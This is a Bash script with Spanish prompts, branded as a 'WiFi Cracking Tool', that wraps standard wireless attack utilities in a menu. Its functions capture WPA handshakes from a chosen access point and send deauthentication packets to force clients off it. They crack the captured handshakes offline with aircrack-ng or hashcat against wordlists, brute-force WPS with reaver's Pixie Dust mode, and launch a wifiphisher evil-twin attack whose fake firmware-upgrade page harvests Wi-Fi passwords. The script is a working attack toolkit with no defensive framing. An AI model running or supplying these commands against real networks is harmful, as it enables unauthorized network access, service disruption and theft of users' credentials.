#!/bin/bash

# Configuración
DEFAULT_INTERFACE="wlan1"
CAPTURE_DIR="caps"
CAPTURE_FILE="$CAPTURE_DIR/captura"
CURRENT_BSSID=""
CURRENT_CHANNEL=""
DICT_PATH="rockyou.txt"
DICTIONARY_DIR="./diccionarios"  # Carpeta donde están los diccionarios

mkdir -p $CAPTURE_DIR

# Función para mostrar la BSSID seleccionada
show_current_bssid() {
    if [[ -n "$CURRENT_BSSID" ]]; then
        echo -e "\033[1;32m[*] BSSID seleccionada: $CURRENT_BSSID (Canal: $CURRENT_CHANNEL)\033[0m" # Verde
    else
        echo -e "\033[1;31m[*] No hay BSSID seleccionada aún.\033[0m" # Rojo
    fi
}

# Función para limpiar la carpeta caps
clean_capture_folder() {
    rm -rf $CAPTURE_DIR/*
    echo -e "\033[1;33m[+] Se han eliminado todos los archivos en $CAPTURE_DIR.\033[0m" # Amarillo
    sleep 2
}

# Función para poner la interfaz en modo monitor
enable_monitor_mode() {
    echo -e '\033[1;34m[+] Listando interfaces de red disponibles...\033[0m' # Azul
    interfaces=($(ip link show | awk -F': ' '/^[0-9]+: / {print $2}'))  # Obtener lista de interfaces
    
    for i in "${!interfaces[@]}"; do
        echo -e "\033[1;33m[$i]\033[0m ${interfaces[$i]}"  # Amarillo para los números
    done

    read -p "Ingrese el número de la interfaz que desea configurar en modo monitor: " selection

    if [[ ! "$selection" =~ ^[0-9]+$ ]] || (( selection < 0 || selection >= ${#interfaces[@]} )); then
        echo -e "\033[1;31m[-] Selección inválida.\033[0m"  # Rojo
        return
    fi

    DEFAULT_INTERFACE="${interfaces[$selection]}"
    
    # Verificar si ya está en modo monitor
    mode=$(iw dev "$DEFAULT_INTERFACE" info | awk '/type/ {print $2}')
    
    if [[ "$mode" == "monitor" ]]; then
        echo -e "\033[1;33m[!] La interfaz $DEFAULT_INTERFACE ya está en modo monitor.\033[0m" # Amarillo
        sleep 3
        return
    fi

    echo -e "\033[1;34m[+] Configurando $DEFAULT_INTERFACE en modo monitor...\033[0m" # Azul
    sudo ip link set "$DEFAULT_INTERFACE" down && sleep 1
    sudo iw dev "$DEFAULT_INTERFACE" set type monitor && sleep 1
    sudo ip link set "$DEFAULT_INTERFACE" up && sleep 1

    # Verificar nuevamente si el modo monitor se activó correctamente
    mode_check=$(iw dev "$DEFAULT_INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$mode_check" == "monitor" ]]; then
        echo -e "\033[1;32m[+] Interfaz $DEFAULT_INTERFACE lista en modo monitor.\033[0m" # Verde
    else
        echo -e "\033[1;31m[-] Error: No se pudo activar el modo monitor en $DEFAULT_INTERFACE.\033[0m" # Rojo
    fi
    sleep 3
}




# Función para quitar el modo monitor y restaurar el modo gestionado
disable_monitor_mode() {
    echo -e '\033[1;34m[+] Listando interfaces de red en modo monitor...\033[0m' # Azul
    interfaces=($(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}'))  # Obtener interfaces en modo monitor

    if [[ ${#interfaces[@]} -eq 0 ]]; then
        echo -e "\033[1;33m[!] No hay interfaces en modo monitor.\033[0m" # Amarillo
        sleep 3
        return
    fi

    for i in "${!interfaces[@]}"; do
        echo -e "\033[1;33m[$i]\033[0m ${interfaces[$i]}"  # Amarillo para los números
    done

    read -p "Ingrese el número de la interfaz que desea restaurar a modo gestionado: " selection

    if [[ ! "$selection" =~ ^[0-9]+$ ]] || (( selection < 0 || selection >= ${#interfaces[@]} )); then
        echo -e "\033[1;31m[-] Selección inválida.\033[0m"  # Rojo
        return
    fi

    DEFAULT_INTERFACE="${interfaces[$selection]}"

    echo -e "\033[1;34m[+] Restaurando $DEFAULT_INTERFACE a modo gestionado...\033[0m" # Azul
    sudo ip link set "$DEFAULT_INTERFACE" down && sleep 1
    sudo iw dev "$DEFAULT_INTERFACE" set type managed && sleep 1
    sudo ip link set "$DEFAULT_INTERFACE" up && sleep 1
    sudo rfkill unblock wifi

    # Verificar si el cambio fue exitoso
    mode_check=$(iw dev "$DEFAULT_INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$mode_check" == "managed" ]]; then
        echo -e "\033[1;32m[+] Interfaz $DEFAULT_INTERFACE restaurada a modo gestionado.\033[0m" # Verde
    else
        echo -e "\033[1;31m[-] Error: No se pudo restaurar $DEFAULT_INTERFACE a modo gestionado.\033[0m" # Rojo
    fi
    sleep 3
}

 # Verifica si el modo monitor está activado
monitor_mode_isenable(){
    if ! iw dev $DEFAULT_INTERFACE info | grep -q "type monitor"; then
        echo -e '\033[1;31m[!] Modo monitor no activado. Activando...\033[0m'  # Rojo
        sudo ip link set $DEFAULT_INTERFACE down
        sudo iw dev $DEFAULT_INTERFACE set type monitor
        sudo ip link set $DEFAULT_INTERFACE up
        sleep 2
        exit
    fi
}

# Función para escanear redes disponibles
scan_networks() {
    monitor_mode_isenable
    gnome-terminal -- bash -c "
        echo -e '\033[1;35m[+] Escaneando redes WiFi...\033[0m'; # Magenta
        sudo airodump-ng $DEFAULT_INTERFACE;
        echo -e '\033[1;35m[+] Escaneo finalizado.\033[0m';
        sleep 2;
    bash"
}


# Función para capturar tráfico de una red específica
capture_traffic() {
    # Limpiar archivos antes de capturar
    clean_capture_folder
    
    read -p "Ingrese el BSSID del AP objetivo: " CURRENT_BSSID
    read -p "Ingrese el canal (CH) del AP objetivo: " CURRENT_CHANNEL
    
    mkdir -p $CAPTURE_DIR
    gnome-terminal -- bash -c "
        echo -e '\033[1;36m[+] Iniciando captura en el canal $CURRENT_CHANNEL...\033[0m'; # Cian
        sudo airodump-ng --bssid $CURRENT_BSSID -c $CURRENT_CHANNEL --write $CAPTURE_FILE $DEFAULT_INTERFACE;
        echo -e '\033[1;36m[+] Captura terminada.\033[0m';
        sleep 2;
    exit"
}

# Función para enviar paquetes de desautenticación
deauth_client() {
    show_current_bssid
    read -p "Ingrese la MAC del cliente a desconectar: " CLIENT_MAC
    read -p "Cantidad de paquetes de deauth (Enter para 10): " DEAUTH_COUNT
    DEAUTH_COUNT=${DEAUTH_COUNT:-10}
    
    if [[ -z "$CURRENT_BSSID" ]]; then
        echo -e "\033[1;31m[-] Error: No hay una BSSID seleccionada. Capture tráfico primero.\033[0m" # Rojo
        sleep 2
        return
    fi
    
    gnome-terminal -- bash -c "
        echo -e '\033[1;32m[+] Enviando $DEAUTH_COUNT paquetes de deauth...\033[0m'; # Verde
        sudo aireplay-ng --deauth $DEAUTH_COUNT -a $CURRENT_BSSID -c $CLIENT_MAC $DEFAULT_INTERFACE;
        echo -e '\033[1;32m[+] Ataque completado.\033[0m';
        sleep 2;
    exit"
}

# Función para crackear con CPU
crack_with_cpu() {
    if [ ! -d "$DICTIONARY_DIR" ]; then
        echo -e "\033[1;31m[-] La carpeta de diccionarios no existe.\033[0m" # Rojo
        return
    fi
    echo -e "\033[1;34m[+] Diccionarios disponibles:\033[0m"  # Azul
    select DICT_PATH in "$DICTIONARY_DIR"/*; do
        if [ -n "$DICT_PATH" ]; then
            echo -e "\033[1;32m[+] Has seleccionado: $DICT_PATH\033[0m"  # Verde
            break
        else
            echo -e "\033[1;31m[-] Opción inválida. Intente nuevamente.\033[0m"  # Rojo
        fi
    done
    
    # Inicia el crackeo con el diccionario seleccionado
    gnome-terminal -- bash -c "
        echo -e '\033[1;33m[+] Iniciando crackeo con el diccionario...\033[0m'; # Amarillo
        sudo aircrack-ng $CAPTURE_FILE-01.cap -w $DICT_PATH;
        echo -e '\033[1;33m[+] Crackeo finalizado.\033[0m';
        sleep 2;
    bash"
}


# Función para crackear con GPU usando hashcat
crack_with_gpu() {
    if [ ! -d "$DICTIONARY_DIR" ]; then
        echo -e "\033[1;31m[-] La carpeta de diccionarios no existe.\033[0m" # Rojo
        return
    fi
    echo -e "\033[1;34m[+] Diccionarios disponibles:\033[0m"  # Azul
    select DICT_PATH in "$DICTIONARY_DIR"/*; do
        if [ -n "$DICT_PATH" ]; then
            echo -e "\033[1;32m[+] Has seleccionado: $DICT_PATH\033[0m"  # Verde
            break
        else
            echo -e "\033[1;31m[-] Opción inválida. Intente nuevamente.\033[0m"  # Rojo
        fi
    done
    gnome-terminal -- bash -c "
        echo -e '\033[1;33m[+] Iniciando crackeo con GPU...\033[0m'; # Amarillo
        hcxpcapngtool -o $CAPTURE_DIR/captura.22000 $CAPTURE_FILE-01.cap;
        if [[ $? -ne 0 ]]; then
            echo -e '\033[1;31m[-] Error al procesar la captura.\033[0m'; # Rojo
            sleep 2;
            exit 1;
        fi
        echo -e '\033[1;33m[+] Hashcat iniciando...\033[0m';
        hashcat -m 22000 -a 0 $CAPTURE_DIR/captura.22000 \"$DICT_PATH\" --show;
        if [[ $? -ne 0 ]]; then
            echo -e '\033[1;31m[-] Error al ejecutar hashcat.\033[0m'; # Rojo
            sleep 2;
            exit 1;
        fi
        echo -e '\033[1;33m[+] Crackeo finalizado.\033[0m';
    bash"  
}


crack_wps(){
    monitor_mode_isenable
    read -p "Ingrese el BSSID del AP objetivo: " CURRENT_BSSID
    read -p "Ingrese el canal (CH) del AP objetivo: " CURRENT_CHANNEL
     if [[ -z "$CURRENT_BSSID" ]]; then
        echo -e "\033[1;31m[-] Error: No hay una BSSID seleccionada. Capture tráfico primero.\033[0m" # Rojo
        sleep 2
        return
    fi
    
    gnome-terminal -- bash -c "
    echo -e '\033[1;33m[+] Iniciando crackeo con WPS...\033[0m'; # Amarillo
           sudo reaver -i wlan1 -b $CURRENT_BSSID -vv -K 1 -c $CURRENT_CHANNEL
    bash";
    sleep 3
}

# Función para crackear con WifiPhisher
crack_with_wifiphisher() {
   monitor_mode_isenable
    gnome-terminal -- bash -c "
    echo -e '\033[1;33m[+] Iniciando crackeo con WifiPhisher...\033[0m'; # Amarillo
        sudo wifiphisher -iI wlan1 -p firmware-upgrade;
        sudo service NetworkManager restart;
    bash";
   # Verificar si ya está en modo monitor
    mode=$(iw dev "$DEFAULT_INTERFACE" info | awk '/type/ {print $2}')
    
    if [[ "$mode" == "monitor" ]]; then
        echo -e "\033[1;33m[!] La interfaz $DEFAULT_INTERFACE ya está en modo monitor.\033[0m" # Amarillo
        return
    fi

    echo -e "\033[1;34m[+] Configurando $DEFAULT_INTERFACE en modo monitor...\033[0m" # Azul
    sudo ip link set "$DEFAULT_INTERFACE" down && sleep 1
    sudo iw dev "$DEFAULT_INTERFACE" set type monitor && sleep 1
    sudo ip link set "$DEFAULT_INTERFACE" up && sleep 1

    # Verificar nuevamente si el modo monitor se activó correctamente
    mode_check=$(iw dev "$DEFAULT_INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$mode_check" == "monitor" ]]; then
        echo -e "\033[1;32m[+] Interfaz $DEFAULT_INTERFACE lista en modo monitor.\033[0m" # Verde
    else
        echo -e "\033[1;31m[-] Error: No se pudo activar el modo monitor en $DEFAULT_INTERFACE.\033[0m" # Rojo
    fi
    sleep 3
}

# Función para mostrar interfaces de red y su estado de modo
show_interfaces() {
   gnome-terminal -- bash -c " echo -e '\033[1;34m[+] Mostrando interfaces de red y su estado...\033[0m'  # Azul
    interfaces=$(ls /sys/class/net)
    for interface in $interfaces; do
        if iw dev $interface info | grep -q "type monitor"; then
            echo -e "\033[1;32m[+] $interface está en modo monitor.\033[0m"  # Verde
        else
            echo -e "\033[1;31m[-] $interface NO está en modo monitor.\033[0m"  # Rojo
        fi
    done
     bash";
}


 exit_system(){
    clear;
    echo -e "\033[1;34m Finalizando Dark Wolf Apps - WiFi Cracking Tool \033[0m";
    disable_monitor_mode
    clear;
    exit;
 }

# Menú de opciones
while true; do
    clear
    echo -e "\033[1;34m[WiFi Cracking Tool]\033[0m"
    echo "1. Mostrar Interfaces"
    echo "2. Activar Interfaz en modo monitor"
    echo "3. Desactivar Interfaz en modo monitor"
    echo "4. Escanear redes WiFi"
    echo "5. Capturar tráfico"
    echo "6. Enviar paquetes de desautenticación"
    echo "7. Crackear con WifiPhisher"
    echo "8. Crackear con CPU"
    echo "9. Crackear con GPU (hashcat)"
    echo "10. Crackear con WPS"
    echo "11. Limpiar la carpeta de capturas"
    echo "12. Salir"
    read -p "Seleccione una opción: " option
    
    case $option in
        1) show_interfaces ;;
        2) enable_monitor_mode ;;
        3) disable_monitor_mode ;;
        4) scan_networks ;;
        5) capture_traffic ;;
        6) deauth_client ;;
        7) crack_with_wifiphisher ;;
        8) crack_with_cpu ;;
        9) crack_with_gpu ;;
        10) crack_wps ;;
        11) clean_capture_folder ;;
        12) exit_system ;;
        *) echo -e "\033[1;31m[Error] Opción no válida.\033[0m" ;;
    esac
done

